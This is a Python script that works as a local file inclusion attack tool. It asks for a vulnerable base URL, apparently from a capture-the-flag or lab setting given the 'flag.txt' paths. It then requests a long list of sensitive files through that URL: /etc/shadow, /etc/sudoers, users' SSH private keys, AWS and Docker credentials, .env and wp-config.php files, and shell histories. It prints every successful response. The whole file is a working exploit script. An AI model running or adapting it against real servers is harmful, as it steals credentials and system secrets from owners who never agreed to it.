import requests

# Common file paths for LFI attacks
file_paths = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/etc/apache2/apache2.conf",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/messages",
    "/etc/httpd/httpd.conf",
    "/etc/nginx/nginx.conf",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/messages",
    "/etc/my.cnf",
    "/etc/mongodb.conf",
    "/etc/redis/redis.conf",
    "/var/lib/mysql/mysql.sock",
    "/var/lib/mysql/",
    "/etc/php.ini",
    "/var/www/html/wp-config.php",
    "/var/www/wp-config.php",
    "/var/www/wp-includes/wp-db.php",
    "/var/www/wp-content/debug.log",
    "/var/www/wp-admin/admin-ajax.php",
    "/var/www/html/configuration.php",
    "/var/www/html/sites/default/settings.php",
    "/var/www/html/app/config/parameters.yml",
    "/var/www/html/.env",
    "/var/www/html/wp-includes/wp-db.php",
    "/var/www/html/wp-content/debug.log",
    "/var/www/html/wp-admin/admin-ajax.php",
    "/etc/sudoers",
    "/etc/ssh/sshd_config",
    "/etc/crontab",
    "/etc/fstab",
    "/etc/exports",
    "/etc/network/interfaces",
    "/etc/resolv.conf",
    "/etc/sysctl.conf",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/httpd/access.log",
    "/var/log/httpd/error.log",
    "/usr/local/apache2/logs/access_log",
    "/usr/local/apache2/logs/error_log"
]

# Prompt user for usernames and append known user locations
usernames = []
while True:
    username = input("Enter a username (leave blank to finish): ")
    if not username:
        break
    usernames.append(username)

for username in usernames:
    file_paths.extend([
        f"/home/{username}/flag.txt",
        f"/home/{username}/.ssh",
        f"/home/{username}/.bash_history",
        f"/home/{username}/.ssh/authorized_keys",
        f"/home/{username}/.ssh/id_rsa",
        f"/home/{username}/.ssh/id_rsa.pub",
        f"/home/{username}/.ssh/known_hosts",
        f"/home/{username}/.profile",
        f"/home/{username}/.viminfo",
	f"/home/{username}/.mysql_history",
        f"/home/{username}/.psql_history",
        f"/home/{username}/.gitconfig",
        f"/home/{username}/.config/gcloud/configurations/config_default",
        f"/home/{username}/.aws/credentials",
        f"/home/{username}/.aws/config",
        f"/home/{username}/.docker/config.json",
        f"/home/{username}/.npmrc",
        f"/home/{username}/.htpasswd",
        f"/home/{username}/.local/share/keyrings",
	f"/var/spool/cron/crontabs/{username}",
        f"/var/mail/{username}",
        f"/etc/sysconfig/network-scripts/ifcfg-{username}",
    ])

# Prompt user for the base URL
base_url = input("Enter the base URL (e.g. http://172.16.1.10/nav.php?page=): ")

# Iterate through the file paths and attempt to retrieve content
for file_path in file_paths:
    url = base_url + file_path
    print(f"Trying {url}")
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Success! Contents of {file_path}:")
            print(response.text)
            print("\n" + "-" * 80 + "\n")
        else:
            print(f"Failed to access {file_path} (Status code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

print("Finished scanning.")
